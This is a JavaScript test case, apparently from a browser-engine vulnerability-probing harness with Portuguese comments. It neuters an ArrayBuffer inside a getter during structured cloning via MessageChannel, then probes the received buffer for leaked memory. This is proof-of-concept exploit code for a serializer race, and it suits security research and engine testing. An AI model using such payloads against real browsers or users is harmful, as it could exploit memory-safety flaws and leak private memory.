export default {
    id:       'STRUCTURED_CLONE_MUTATION',
    category: 'Concurrency',
    risk:     'CRITICAL',
    description:
        'Transfere a ownership de um ArrayBuffer durante a clonagem de um getter. ' +
        'Lemos o port2 (destino) para verificar se o Serializer C++ copiou lixo da RAM ' +
        'após o buffer original ter sido castrado sincronamente no meio do processo.',

    setup: function() {
        this.results = {};
        this.channel = new MessageChannel();
        this.buffer = new ArrayBuffer(1024);
        new Uint32Array(this.buffer)[0] = 0xBADF00D;

        // FIX: O Observador (Aguardamos a entrega corrompida do C++)
        this.received = null;
        this.channel.port2.onmessage = e => { this.received = e.data; };
        this.channel.port2.start();

        const self = this;
        this.evilPayload = {
            a: 1,
            get b() {
                try {
                    // O GATILHO: Neutering Síncrono a meio da serialização C++
                    self.channel.port1.postMessage("transfer", [self.buffer]);
                } catch(e) {}
                return 2;
            },
            c: this.buffer // O C++ já calculou o tamanho disto, mas agora a memória evaporou
        };
    },

    trigger: function() {
        try {
            this.channel.port1.postMessage(this.evilPayload);
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O C++ atirou DataCloneError ou engoliu a corrupção?
        s => s.results.error || 'Sem erro JS - Clonagem seguiu em frente',
        
        // Probe 1: A integridade do objeto recebido
        s => s.received ? `Chegou! a=${s.received.a}, b=${s.received.b}` : 'Pacote perdido',
        
        // Probe 2: A LEITURA DA CORRUPÇÃO!
        s => {
            if (s.received && s.received.c) {
                // Se c tiver um byteLength > 0, o C++ copiou lixo em vez de perceber o neutering!
                if (s.received.c.byteLength > 0) {
                    let view = new Uint32Array(s.received.c);
                    return `💥 INFO LEAK C++: Leu ${s.received.c.byteLength} bytes de lixo. 0x${view[0]?.toString(16)}`;
                }
                return 'Seguro (Buffer recebido vazio)';
            }
            return 'Seguro (Buffer não chegou)';
        }
    ],

    cleanup: function() {
        this.buffer = null;
        this.evilPayload = null;
        this.received = null;
        try { this.channel.port1.close(); this.channel.port2.close(); } catch(e){}
    }
};
